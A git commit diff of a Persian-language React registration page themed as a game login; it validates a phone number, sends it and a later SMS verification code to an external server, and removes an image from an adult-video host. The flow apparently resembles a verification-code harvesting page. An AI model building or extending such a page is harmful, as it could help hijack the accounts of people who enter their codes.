9ef6a658cd9725c9be4fb3235edf7702eab61c3d
amer <amerea913@email.com>
2026-06-17 04:32:17 +0400

    fix register ui + correct structure

--- src/Register.jsx
+++ src/Register.jsx
@@ -7,6 +7,11 @@ export default function Register() {
   const [userId, setUserId] = useState("");
 
   const sendPhone = async () => {
+    if (!/^09\d{9}$/.test(phone)) {
+      alert("شماره درست نیست");
+      return;
+    }
+
     const res = await fetch("https://khafan-site.onrender.com/phone", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -15,8 +20,6 @@ export default function Register() {
 
     const data = await res.json();
     setUserId(data.id);
-
-    alert("کد از طریق SMS ارسال شد. لطفاً کد را وارد کنید");
     setStep(2);
   };
 
@@ -27,48 +30,38 @@ export default function Register() {
       body: JSON.stringify({ code }),
     });
 
-    alert("ثبت شد ✅");
+    alert("اوکی شد 🔥");
   };
 
   return (
     <div className="page">
-      <div className="bg"></div>
-
       <div className="card">
+
+        <img
+          src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
+          className="img"
+        />
+
+        <h2>ورود به بازی</h2>
+
         {step === 1 && (
           <>
-            <img
-              className="img"
-              src="https://fi1-ph.ypncdn.com/videos/202505/02/468061265/original/(m=eaSaaTbWx)(mh=ZYcC24OaVFTpvG-v)3.jpg"
-            />
-
-            <h2>ورود به بازی</h2>
-
             <input
               value={phone}
               onChange={(e) => setPhone(e.target.value)}
               placeholder="09xxxxxxxxx"
             />
-
-            <button onClick={sendPhone}>ارسال کد</button>
+            <button onClick={sendPhone}>ثبت نام</button>
           </>
         )}
 
         {step === 2 && (
           <>
-            <img
-              className="img"
-              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
-            />
-
-            <h2>کد را وارد کنید</h2>
-
             <input
               value={code}
               onChange={(e) => setCode(e.target.value)}
               placeholder="کد تایید"
             />
-
             <button onClick={sendCode}>تایید</button>
           </>
         )}
